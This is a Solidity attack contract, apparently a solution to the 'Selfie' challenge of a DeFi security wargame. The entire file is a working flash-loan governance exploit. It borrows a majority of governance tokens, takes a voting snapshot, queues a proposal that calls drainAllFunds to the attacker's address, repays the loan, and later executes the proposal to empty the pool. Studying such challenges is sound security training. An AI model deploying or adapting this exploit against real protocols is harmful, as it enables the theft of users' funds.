// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IFlashLoanReceiver {
    function receiveTokens(address token, uint256 amount) external;
}

interface IDVTSnapshot {
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function snapshot() external returns (uint256);
}

contract SelfieHack is IFlashLoanReceiver {
    address immutable attacker;
    ISimpleGovernance immutable governance;
    ISelfiePool immutable pool;
    uint256 actionId;

    constructor(ISimpleGovernance _governance, ISelfiePool _pool) {
        attacker = msg.sender;
        governance = _governance;
        pool = _pool;
    }

    // 1. Flash loan enough governance tokens to queue drain action.
    function takeoverGov(uint256 amount) external {
        // Flash loan more than half of all DVT tokens.
        pool.flashLoan(amount); // Triggers receiveTokens()
    }

    function receiveTokens(address token, uint256 amount) external override {
        // Having a majority of governance tokens at this moment, create a snapshot.
        IDVTSnapshot(token).snapshot();
        // Queue a proposal to drain funds.
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        // Pay back flash loan.
        IDVTSnapshot(token).transfer(address(pool), amount);
    }

    // 2. After waiting for the action delay to have passed, execute it.
    function drainToAttacker() external {
        governance.executeAction(actionId);
    }
}
